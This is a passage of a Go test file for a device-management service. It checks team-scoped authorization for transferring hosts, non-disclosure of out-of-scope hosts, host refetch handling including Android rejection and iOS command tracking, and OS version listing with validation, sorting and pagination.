		test.RequireErrKind(t, test.ErrNotFound, err)
	})

	t.Run("team technician cannot move host into a team they don't manage", func(t *testing.T) {
		// Host 10 belongs to team 1, team 1 technician tries to transfer it to team 2.
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamTechnicianTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(2)), []uint{10})
		test.RequireErrKind(t, test.ErrForbidden, err)
	})

	t.Run("team technician cannot transfer host to or from no team", func(t *testing.T) {
		// Host with no team -> team 1 (technician on team 1): blocked on source (no team).
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: nil},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamTechnicianTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrNotFound, err)

		// Host on team 1 -> no team: blocked on destination (no team).
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		err = svc.AddHostsToTeam(userCtx, nil, []uint{10})
		test.RequireErrKind(t, test.ErrForbidden, err)
	})
}

func TestAddHostsToTeamDoesNotLeakOutOfScopeExistence(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return map[string]uint{}, nil
	}

	existing := map[uint]*automdm.Host{
		10: {ID: 10, TeamID: new(uint(2))},
		11: {ID: 11, TeamID: new(uint(1))},
	}
	ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
		var hosts []*automdm.Host
		for _, id := range ids {
			if h, ok := existing[id]; ok {
				hosts = append(hosts, h)
			}
		}
		return hosts, nil
	}

	team1Admin := test.UserContext(ctx, test.UserTeamAdminTeam1)
	globalAdmin := test.UserContext(ctx, test.UserAdmin)

	t.Run("out-of-scope host is reported as not found", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(team1Admin, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrNotFound, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("nonexistent host is reported as not found, even for a global admin", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(globalAdmin, new(uint(1)), []uint{999})
		test.RequireErrKind(t, test.ErrNotFound, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)

		ds.AddHostsToTeamFuncInvoked = false
		err = svc.AddHostsToTeam(team1Admin, new(uint(1)), []uint{999})
		test.RequireErrKind(t, test.ErrNotFound, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("mix of existing and nonexistent hosts fails the whole request", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(globalAdmin, new(uint(1)), []uint{11, 999})
		test.RequireErrKind(t, test.ErrNotFound, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("mix of in-scope and out-of-scope hosts is reported as not found", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(team1Admin, new(uint(1)), []uint{11, 10})
		test.RequireErrKind(t, test.ErrNotFound, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("duplicate IDs of an existing host are not mistaken for missing hosts", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(team1Admin, new(uint(1)), []uint{11, 11})
		require.NoError(t, err)
		require.True(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("visible but non-transferable host stays forbidden", func(t *testing.T) {
		// Admin on team 1, observer on team 2: can read host 10 but not move
		// it, so the real Forbidden surfaces since it discloses nothing new.
		user := &automdm.User{
			ID: 100,
			Teams: []automdm.UserTeam{
				{ID: 1, Role: automdm.RoleAdmin},
				{ID: 2, Role: automdm.RoleObserver},
			},
		}
		ds.AddHostsToTeamFuncInvoked = false
		err := svc.AddHostsToTeam(test.UserContext(ctx, user), new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrForbidden, err)
		require.False(t, ds.AddHostsToTeamFuncInvoked)
	})
}

func TestAddHostsToTeamByFilterSourceTeamAuth(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return nil, nil
	}

	t.Run("team maintainer cannot steal hosts from another team via filter", func(t *testing.T) {
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}

		userCtx := test.UserContext(ctx, test.UserTeamMaintainerTeam1)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		test.RequireErrKind(t, test.ErrNotFound, err)
		assert.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("global admin can transfer hosts across teams via filter", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		require.NoError(t, err)
		assert.True(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("multi-team admin+maintainer can transfer hosts between their teams via filter", func(t *testing.T) {
		multiTeamUser := &automdm.User{
			ID: 99,
			Teams: []automdm.UserTeam{
				{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin},
				{Team: automdm.Team{ID: 2}, Role: automdm.RoleMaintainer},
			},
		}
		// Transfer host from team 2 to team 1
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, multiTeamUser)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		require.NoError(t, err)
		assert.True(t, ds.AddHostsToTeamFuncInvoked)

		// Transfer host from team 1 to team 2
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		emptyFilter = &map[string]any{}
		err = svc.AddHostsToTeamByFilter(userCtx, new(uint(2)), emptyFilter)
		require.NoError(t, err)
		assert.True(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("multi-team admin+observer cannot transfer hosts to or from observed team via filter", func(t *testing.T) {
		multiTeamUser := &automdm.User{
			ID: 100,
			Teams: []automdm.UserTeam{
				{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin},
				{Team: automdm.Team{ID: 2}, Role: automdm.RoleObserver},
			},
		}
		// Transfer host from team 2 (observer) to team 1 (admin) — blocked on source
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, multiTeamUser)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		require.Error(t, err)
		require.Contains(t, err.Error(), "forbidden")
		assert.False(t, ds.AddHostsToTeamFuncInvoked)

		// Transfer host from team 1 (admin) to team 2 (observer) — blocked on destination
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		emptyFilter = &map[string]any{}
		err = svc.AddHostsToTeamByFilter(userCtx, new(uint(2)), emptyFilter)
		require.Error(t, err)
		require.Contains(t, err.Error(), "forbidden")
		assert.False(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("global technician can transfer hosts across teams via filter", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}

		userCtx := test.UserContext(ctx, test.UserTechnician)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		require.NoError(t, err)
		assert.True(t, ds.AddHostsToTeamFuncInvoked)
	})

	t.Run("team technician cannot steal hosts from another team via filter", func(t *testing.T) {
		ds.AddHostsToTeamFuncInvoked = false
		ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}

		userCtx := test.UserContext(ctx, test.UserTeamTechnicianTeam1)
		emptyFilter := &map[string]any{}
		err := svc.AddHostsToTeamByFilter(userCtx, new(uint(1)), emptyFilter)
		test.RequireErrKind(t, test.ErrNotFound, err)
		assert.False(t, ds.AddHostsToTeamFuncInvoked)
	})
}

func TestRefetchHost(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	host := &automdm.Host{ID: 3}

	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return host, nil
	}
	ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
		assert.Equal(t, host.ID, id)
		assert.True(t, value)
		return nil
	}

	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, test.UserAdmin), host.ID))
	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, test.UserObserver), host.ID))
	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, test.UserObserverPlus), host.ID))
	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, test.UserMaintainer), host.ID))
	assert.True(t, ds.HostLiteFuncInvoked)
	assert.True(t, ds.UpdateHostRefetchRequestedFuncInvoked)
}

func TestRefetchHostAndroidNotSupported(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	host := &automdm.Host{ID: 3, Platform: "android"}

	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return host, nil
	}
	ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
		return nil
	}

	err := svc.RefetchHost(test.UserContext(ctx, test.UserAdmin), host.ID)
	require.Error(t, err)
	var bre *automdm.BadRequestError
	require.ErrorAs(t, err, &bre)
	require.ErrorContains(t, err, "Refetch is not supported for Android hosts")

	// A device token can be minted for an Android host, so the device-authenticated
	// route reaches RefetchHost with no host loaded and the platform has to come from
	// the request context.
	err = svc.RefetchHost(test.HostContext(ctx, host), host.ID)
	require.Error(t, err)
	require.ErrorAs(t, err, &bre)
	require.ErrorContains(t, err, "Refetch is not supported for Android hosts")

	// the refetch flag must not be set for a host that can't be refetched
	assert.True(t, ds.HostLiteFuncInvoked)
	assert.False(t, ds.UpdateHostRefetchRequestedFuncInvoked)
}

func TestRefetchHostUserInTeams(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	host := &automdm.Host{ID: 3, TeamID: new(uint(4))}

	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return host, nil
	}
	ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
		assert.Equal(t, host.ID, id)
		assert.True(t, value)
		return nil
	}

	maintainer := &automdm.User{
		Teams: []automdm.UserTeam{
			{
				Team: automdm.Team{ID: 4},
				Role: automdm.RoleMaintainer,
			},
		},
	}
	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, maintainer), host.ID))
	assert.True(t, ds.HostLiteFuncInvoked)
	assert.True(t, ds.UpdateHostRefetchRequestedFuncInvoked)
	ds.HostLiteFuncInvoked, ds.UpdateHostRefetchRequestedFuncInvoked = false, false

	observer := &automdm.User{
		Teams: []automdm.UserTeam{
			{
				Team: automdm.Team{ID: 4},
				Role: automdm.RoleObserver,
			},
		},
	}
	require.NoError(t, svc.RefetchHost(test.UserContext(ctx, observer), host.ID))
	assert.True(t, ds.HostLiteFuncInvoked)
	assert.True(t, ds.UpdateHostRefetchRequestedFuncInvoked)
}

func refetchCommandTypeFromUUID(commandUUID string) string {
	for _, prefix := range []string{
		automdm.RefetchAppsCommandUUIDPrefix,
		automdm.RefetchCertsCommandUUIDPrefix,
		automdm.RefetchDeviceCommandUUIDPrefix,
	} {
		if strings.HasPrefix(commandUUID, prefix) {
			return prefix
		}
	}
	return commandUUID
}

func TestRefetchHostIOSTracksBeforeEnqueue(t *testing.T) {
	host := &automdm.Host{ID: 7, Platform: "ios", UUID: "ios-host-uuid"}

	type testEnv struct {
		ds         *mock.Store
		mdmStorage *mdmmock.MDMAppleStore
		svc        automdm.Service
		ctx        context.Context
		events     []string
	}

	setup := func(t *testing.T, pusher nanomdm_push.Pusher) *testEnv {
		env := &testEnv{
			ds:         new(mock.Store),
			mdmStorage: &mdmmock.MDMAppleStore{},
		}
		env.svc, env.ctx = newTestService(t, env.ds, nil, nil, &TestServerOpts{
			MDMStorage: env.mdmStorage,
			MDMPusher:  pusher,
		})

		env.ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return host, nil
		}
		env.ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
			return nil
		}
		env.ds.GetHostMDMCommandsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostMDMCommand, error) {
			return nil, nil
		}
		env.ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
		}
		env.ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, h *automdm.Host) (bool, error) {
			return true, nil
		}
		env.ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
			return &automdm.HostMDM{InstalledFromDep: true}, nil
		}
		env.ds.GetHostDEPAssignmentFunc = func(ctx context.Context, hostID uint) (*automdm.HostDEPAssignment, error) {
			return nil, &notFoundError{}
		}
		env.ds.GetHostLockWipeStatusFunc = func(ctx context.Context, h *automdm.Host) (*automdm.HostLockWipeStatus, error) {
			return &automdm.HostLockWipeStatus{}, nil
		}
		trackedUUIDs := map[string]string{}
		env.ds.AddHostMDMCommandsFunc = func(ctx context.Context, commands []automdm.HostMDMCommand) error {
			for _, cmd := range commands {
				require.Equal(t, host.ID, cmd.HostID)
				require.True(t, strings.HasPrefix(cmd.CommandUUID, cmd.CommandType),
					"tracking row must record the full prefixed command UUID")
				trackedUUIDs[cmd.CommandType] = cmd.CommandUUID
				env.events = append(env.events, "add:"+cmd.CommandType)
			}
			return nil
		}
		env.ds.RemoveHostMDMCommandFunc = func(ctx context.Context, command automdm.HostMDMCommand) error {
			require.Equal(t, host.ID, command.HostID)
			require.Equal(t, trackedUUIDs[command.CommandType], command.CommandUUID,
				"rollback must target the command it tracked")
			env.events = append(env.events, "remove:"+command.CommandType)
			return nil
		}
		env.mdmStorage.EnqueueCommandFunc = func(ctx context.Context, id []string, cmd *nanomdm.CommandWithSubtype) (map[string]error, error) {
			require.Equal(t, trackedUUIDs[refetchCommandTypeFromUUID(cmd.CommandUUID)], cmd.CommandUUID,
				"enqueued command must be the one the tracking row records")
			env.events = append(env.events, "enqueue:"+refetchCommandTypeFromUUID(cmd.CommandUUID))
			return nil, nil
		}

		return env
	}

	t.Run("tracking rows are written before each enqueue", func(t *testing.T) {
		env := setup(t, &mockAPNSPusher{})

		require.NoError(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
		require.Equal(t, []string{
			"add:" + automdm.RefetchAppsCommandUUIDPrefix,
			"enqueue:" + automdm.RefetchAppsCommandUUIDPrefix,
			"add:" + automdm.RefetchCertsCommandUUIDPrefix,
			"enqueue:" + automdm.RefetchCertsCommandUUIDPrefix,
			"add:" + automdm.RefetchDeviceCommandUUIDPrefix,
			"enqueue:" + automdm.RefetchDeviceCommandUUIDPrefix,
		}, env.events)
	})

	t.Run("enqueue failure untracks only the failed command type", func(t *testing.T) {
		env := setup(t, &mockAPNSPusher{})
		env.mdmStorage.EnqueueCommandFunc = func(ctx context.Context, id []string, cmd *nanomdm.CommandWithSubtype) (map[string]error, error) {
			commandType := refetchCommandTypeFromUUID(cmd.CommandUUID)
			if commandType == automdm.RefetchCertsCommandUUIDPrefix {
				return nil, errors.New("db down")
			}
			env.events = append(env.events, "enqueue:"+commandType)
			return nil, nil
		}

		require.Error(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
		require.Equal(t, []string{
			"add:" + automdm.RefetchAppsCommandUUIDPrefix,
			"enqueue:" + automdm.RefetchAppsCommandUUIDPrefix,
			"add:" + automdm.RefetchCertsCommandUUIDPrefix,
			"remove:" + automdm.RefetchCertsCommandUUIDPrefix,
		}, env.events)
	})

	t.Run("push failure keeps the tracking row", func(t *testing.T) {
		env := setup(t, &mockAPNSPusher{failUUIDs: map[string]bool{host.UUID: true}})

		// the first command's push fails, so RefetchHost returns an error, but
		// the command is durably enqueued and its tracking row must stay
		require.Error(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
		require.False(t, env.ds.RemoveHostMDMCommandFuncInvoked)
		require.Equal(t, []string{
			"add:" + automdm.RefetchAppsCommandUUIDPrefix,
			"enqueue:" + automdm.RefetchAppsCommandUUIDPrefix,
		}, env.events)
	})
}

func TestEmptyTeamOSVersions(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	testVersions := []automdm.OSVersion{{HostsCount: 1, Name: "macOS 12.1", Platform: "darwin"}}

	ds.TeamExistsFunc = func(ctx context.Context, teamID uint) (bool, error) {
		if teamID == 3 {
			return false, nil
		}
		return true, nil
	}
	ds.OSVersionsFunc = func(
		ctx context.Context, teamFilter *automdm.TeamFilter, platform *string, name *string, version *string,
	) (*automdm.OSVersions, error) {
		if *teamFilter.TeamID == 1 {
			return &automdm.OSVersions{CountsUpdatedAt: time.Now(), OSVersions: testVersions}, nil
		}
		if *teamFilter.TeamID == 4 {
			return nil, errors.New("some unknown error")
		}

		return nil, newNotFoundError()
	}

	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []automdm.OSVersion, includeCVSS bool,
		teamID *uint, maxVulnerabilities *int,
	) (map[string]automdm.OSVulnerabilitiesWithCount, error) {
		return nil, nil
	}

	// team exists with stats
	vers, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), new(uint(1)), new("darwin"), nil, nil, automdm.ListOptions{}, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 1)

	// team exists but no stats
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), new(uint(2)), new("darwin"), nil, nil, automdm.ListOptions{}, false, nil)
	require.NoError(t, err)
	assert.Empty(t, vers.OSVersions)

	// team does not exist
	_, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), new(uint(3)), new("darwin"), nil, nil, automdm.ListOptions{}, false, nil)
	require.Error(t, err)
	require.Contains(t, fmt.Sprint(err), "does not exist")

	// some unknown error
	_, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), new(uint(4)), new("darwin"), nil, nil, automdm.ListOptions{}, false, nil)
	require.Error(t, err)
	require.Equal(t, "some unknown error", fmt.Sprint(err))
}

// TestOSVersionsErrorHandling covers the error-handling fixes from #49483:
// invalid platform, invalid OS version id, and the encoding of the
// max_vulnerabilities validation message.
func TestOSVersionsErrorHandling(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.OSVersionsFunc = func(
		ctx context.Context, teamFilter *automdm.TeamFilter, platform *string, name *string, version *string,
	) (*automdm.OSVersions, error) {
		return &automdm.OSVersions{CountsUpdatedAt: time.Now(), OSVersions: []automdm.OSVersion{}}, nil
	}
	ds.OSVersionFunc = func(
		ctx context.Context, osVersionID uint, teamFilter *automdm.TeamFilter,
	) (*automdm.OSVersion, *time.Time, error) {
		return nil, nil, newNotFoundError()
	}
	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []automdm.OSVersion, includeCVSS bool,
		teamID *uint, maxVulnerabilities *int,
	) (map[string]automdm.OSVulnerabilitiesWithCount, error) {
		return nil, nil
	}

	admin := test.UserContext(ctx, test.UserAdmin)

	// An invalid platform is rejected with a validation error instead of
	// silently returning an empty, successful result.
	_, _, _, err := svc.OSVersions(admin, nil, new("notrealplatform"), nil, nil, automdm.ListOptions{}, false, nil)
	require.Error(t, err)
	require.Contains(t, fmt.Sprint(err), "Invalid platform")
	require.False(t, ds.OSVersionsFuncInvoked, "datastore should not be queried when the platform is invalid")

	// A documented platform is still accepted, and so is a Linux distribution's platform.
	for _, platform := range []string{"ios", "linux", "cachyos", "archarm"} {
		_, _, _, err = svc.OSVersions(admin, nil, new(platform), nil, nil, automdm.ListOptions{}, false, nil)
		require.NoError(t, err, platform)
	}

	// A negative max_vulnerabilities returns a readable message with no ">"
	// character (JSON encoding would otherwise escape it to ">").
	_, _, _, err = svc.OSVersions(admin, nil, nil, nil, nil, automdm.ListOptions{}, false, new(-5))
	require.Error(t, err)
	require.Contains(t, fmt.Sprint(err), "cannot be negative")
	require.NotContains(t, fmt.Sprint(err), ">")

	_, _, err = svc.OSVersion(admin, 1, nil, false, new(-5))
	require.Error(t, err)
	require.Contains(t, fmt.Sprint(err), "cannot be negative")

	// A non-existent OS version id returns a not-found error rather than a
	// 200 response with a null-filled object.
	_, _, err = svc.OSVersion(admin, 99999, nil, false, nil)
	require.Error(t, err)
	require.True(t, automdm.IsNotFound(err), "expected a not-found error for a missing OS version id")
}

func TestOSVersionsListOptions(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	testVersions := []automdm.OSVersion{
		{HostsCount: 4, NameOnly: "Windows 11 Pro 22H2", Platform: "windows"},
		{HostsCount: 1, NameOnly: "macOS 12.1", Platform: "darwin"},
		{HostsCount: 2, NameOnly: "macOS 12.2", Platform: "darwin"},
		{HostsCount: 3, NameOnly: "Windows 11 Pro 21H2", Platform: "windows"},
		{HostsCount: 5, NameOnly: "Ubuntu 20.04", Platform: "ubuntu"},
		{HostsCount: 6, NameOnly: "Ubuntu 21.04", Platform: "ubuntu"},
	}

	now := time.Now()

	ds.OSVersionsFunc = func(
		ctx context.Context, teamFilter *automdm.TeamFilter, platform *string, name *string, version *string,
	) (*automdm.OSVersions, error) {
		return &automdm.OSVersions{CountsUpdatedAt: now, OSVersions: testVersions}, nil
	}

	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []automdm.OSVersion, includeCVSS bool,
		teamID *uint, maxVulnerabilities *int,
	) (map[string]automdm.OSVulnerabilitiesWithCount, error) {
		return nil, nil
	}

	// test default descending count sort
	opts := automdm.ListOptions{}
	vers, _, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 6)
	assert.Equal(t, "Ubuntu 21.04", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "Ubuntu 20.04", vers.OSVersions[1].NameOnly)
	assert.Equal(t, "Windows 11 Pro 22H2", vers.OSVersions[2].NameOnly)
	assert.Equal(t, "Windows 11 Pro 21H2", vers.OSVersions[3].NameOnly)
	assert.Equal(t, "macOS 12.2", vers.OSVersions[4].NameOnly)
	assert.Equal(t, "macOS 12.1", vers.OSVersions[5].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// test ascending count sort
	opts = automdm.ListOptions{OrderKey: "hosts_count", OrderDirection: automdm.OrderAscending}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 6)
	assert.Equal(t, "macOS 12.1", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "macOS 12.2", vers.OSVersions[1].NameOnly)
	assert.Equal(t, "Windows 11 Pro 21H2", vers.OSVersions[2].NameOnly)
	assert.Equal(t, "Windows 11 Pro 22H2", vers.OSVersions[3].NameOnly)
	assert.Equal(t, "Ubuntu 20.04", vers.OSVersions[4].NameOnly)
	assert.Equal(t, "Ubuntu 21.04", vers.OSVersions[5].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// platform filtering
	opts = automdm.ListOptions{MatchQuery: "darwin"}
	vers, count, _, err := svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, new("darwin"), nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 2)
	assert.Equal(t, 2, count)
	assert.Equal(t, "macOS 12.2", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "macOS 12.1", vers.OSVersions[1].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// pagination
	opts = automdm.ListOptions{Page: 0, PerPage: 2}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 2)
	assert.Equal(t, "Ubuntu 21.04", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "Ubuntu 20.04", vers.OSVersions[1].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	opts = automdm.ListOptions{Page: 1, PerPage: 2}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 2)
	assert.Equal(t, "Windows 11 Pro 22H2", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "Windows 11 Pro 21H2", vers.OSVersions[1].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// pagination + ascending hosts_count sort
	opts = automdm.ListOptions{Page: 0, PerPage: 2, OrderKey: "hosts_count", OrderDirection: automdm.OrderAscending}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 2)
	assert.Equal(t, "macOS 12.1", vers.OSVersions[0].NameOnly)
	assert.Equal(t, "macOS 12.2", vers.OSVersions[1].NameOnly)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// per page too high
	opts = automdm.ListOptions{Page: 0, PerPage: 1000}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 6)
	assert.Equal(t, now, vers.CountsUpdatedAt)

	// Page number too high
	opts = automdm.ListOptions{Page: 1000, PerPage: 2}
	vers, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), nil, nil, nil, nil, opts, false, nil)
	require.NoError(t, err)
	assert.Len(t, vers.OSVersions, 0)
	assert.Equal(t, now, vers.CountsUpdatedAt)
}

func TestOSVersionsOrderByVersion(t *testing.T) {
